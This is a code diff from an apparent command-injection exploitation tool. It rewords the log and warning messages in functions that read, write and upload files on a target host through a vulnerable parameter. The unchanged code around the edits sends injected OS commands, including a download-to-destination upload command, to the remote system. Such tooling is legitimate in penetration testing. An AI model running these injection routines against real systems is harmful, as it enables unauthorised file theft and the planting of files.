@@ -35,6 +35,10 @@ Read a file from the target host.
 """
 def file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_read = menu.options.file_read.encode(settings.DEFAULT_CODEC).decode()
+  info_msg = "Trying to read the content of file '"  
+  info_msg += file_to_read + "'."
+  print(settings.print_info_msg(info_msg))
+
   # Execute command
   if settings.TARGET_OS == "win":
     cmd = settings.WIN_FILE_READ + file_to_read
@@ -52,19 +56,19 @@ def file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http
   if settings.VERBOSITY_LEVEL != 0 and menu.options.ignore_session:
     print(settings.SINGLE_WHITESPACE)
   if shell:
-    info_msg = "The contents of file '"  
-    info_msg += file_to_read + "'" + Style.RESET_ALL + ": "
-    sys.stdout.write(settings.print_bold_info_msg(info_msg))
-    print(shell)
+    info_msg = "Content of file '"  
+    info_msg += file_to_read + "' has been extracted."
+    print(settings.print_bold_info_msg(info_msg))
+    print(settings.print_sub_content(shell))
     output_file = open(filename, "a")
     if not menu.options.no_logging:
-      info_msg = "The contents of file '"
+      info_msg = "Extracted content of file '"
       info_msg += file_to_read + "' : " + shell + ".\n"
       output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
     output_file.close()
   else:
     warn_msg = "It seems that you don't have permissions "
-    warn_msg += "to read the '" + file_to_read + "' file."
+    warn_msg += "to read the content of file '" + file_to_read + "'."
     print(settings.print_warning_msg(warn_msg))
 
 """
@@ -94,6 +98,10 @@ def file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, htt
     dest_to_write = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_write)[1]
   else:
     dest_to_write = menu.options.file_dest
+
+  info_msg = "Trying to write content of file '"  
+  info_msg += file_to_write + "' on a remote directory '" + dest_to_write + "'."
+  print(settings.print_info_msg(info_msg))
 
   # Execute command
   if settings.TARGET_OS == "win":
@@ -135,8 +143,7 @@ def file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, htt
   #if settings.VERBOSITY_LEVEL != 0:
   #  print(settings.SINGLE_WHITESPACE)
   if shell:
-    info_msg = "The '" +  shell
-    info_msg += Style.RESET_ALL + Style.BRIGHT + "' file was created successfully." 
+    info_msg = "The file has been successfully created on remote directory '" + dest_to_write + "'." 
     print(settings.print_bold_info_msg(info_msg))
   else:
     warn_msg = "It seems that you don't have permissions to write the '" + dest_to_write + "' file."
@@ -173,6 +180,10 @@ def file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, ht
     else:
       dest_to_upload = menu.options.file_dest
       
+    info_msg = "Trying to upload the file '"  
+    info_msg += file_to_upload + "' on a remote directory '" + dest_to_upload + "'."
+    print(settings.print_info_msg(info_msg))
+
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -190,11 +201,10 @@ def file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, ht
     if settings.VERBOSITY_LEVEL != 0:
       print(settings.SINGLE_WHITESPACE)
     if shell:
-      info_msg = "The '" +  shell
-      info_msg += Style.RESET_ALL + Style.BRIGHT + "' file was uploaded successfully." 
+      info_msg = "The file has been successfully uploaded on remote directory '" + dest_to_upload + "'."
       print(settings.print_bold_info_msg(info_msg))
     else:
-      warn_msg = "It seems that you don't have permissions to write the '" + dest_to_upload + "' file."
+      warn_msg = "It seems that you don't have permissions to upload the '" + dest_to_upload + "' file."
       print(settings.print_warning_msg(warn_msg))
 
 """
